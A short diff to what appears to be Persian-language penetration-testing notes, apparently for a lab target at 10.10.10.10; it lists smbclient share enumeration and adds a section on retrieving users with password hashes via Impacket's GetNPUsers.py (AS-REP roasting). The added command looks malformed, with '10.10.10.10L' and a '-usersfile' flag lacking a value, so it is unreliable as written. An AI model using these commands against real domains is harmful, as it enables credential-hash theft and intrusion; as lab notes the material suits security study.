@@ -1379,3 +1379,9 @@ smbclient //10.10.10.10/forensic
 ```text
 smbclient //10.10.10.10/profiles$
 ```
+
+## دریافت کاربران به همراه هش کلمه عبور
+
+```text
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 10.10.10.10L -usersfile
+```
